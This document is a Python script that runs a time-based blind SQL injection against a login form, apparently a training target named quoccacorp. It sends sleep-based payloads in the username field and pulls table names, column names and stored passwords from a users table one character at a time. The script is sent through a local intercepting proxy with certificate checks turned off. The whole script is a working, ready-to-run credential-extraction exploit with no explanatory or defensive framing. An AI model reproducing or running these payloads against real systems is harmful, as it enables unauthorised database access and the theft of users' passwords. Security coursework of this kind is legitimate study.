import requests

proxies = {
  'https': 'http://127.0.0.1:8080',
}
requests.packages.urllib3.disable_warnings() 
headers = {
    "Host": "login.quoccacorp.com",
    "Content-Length": "146",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Chromium";v="133", "Not(A:Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://login.quoccacorp.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://login.quoccacorp.com/v5",
}
for offset in range(1,1000):
    
    res = ""
    for index in range(1,200):
        length = len(res)
        for i in range(65,128):
            
            #index = 1
            data = {
            "username":f"' + (IF(SUBSTR(  (SELECT table_name FROM information_schema.tables LIMIT 1),{index},1)='{chr(i)}' ,sleep(0.5),1))-- c",
            "password":""
        }
            data1 = {
                "username":f"' + (IF(SUBSTR(  (SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1),{index},1)='{chr(i)}' ,sleep(0.5),1))-- c",
                "password":""
            }
            data3 = {
                "username":f"' + (IF(SUBSTR(  (SELECT password FROM users LIMIT 1 OFFSET 0),{index},1)='{chr(i)}' ,sleep(0.5),1))-- c",
                "password":""
            }

            r = requests.post("https://login.quoccacorp.com/v5", headers=headers,data=data3,proxies=proxies, verify=False)
            print("trying offset", index, "char ", chr(i),"cur res = ",res,i,r.elapsed.total_seconds(),end="\r")
            if r.elapsed.total_seconds() > 0.5:
                res += chr(i)
                break
        if len(res) == length:
            break
        length = len(res)
                #print(res)
            #print(r.headers)
    print(res)
